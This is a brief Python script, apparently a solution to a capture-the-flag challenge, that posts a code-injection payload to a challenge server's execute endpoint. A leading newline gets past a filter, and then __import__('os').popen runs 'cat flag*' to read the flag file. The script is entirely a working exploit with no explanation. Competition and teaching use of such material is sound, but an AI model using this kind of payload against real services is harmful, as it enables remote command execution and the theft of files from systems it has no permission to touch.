#!/usr/bin/env python3
import requests
import string,sys
url = 'https://uoftctf-no-code.chals.io/execute'

payload = "\n__import__('os').popen('cat flag*').read()"

data = {
    'code': payload
}
response = requests.post(url, data=data)
print(response.text)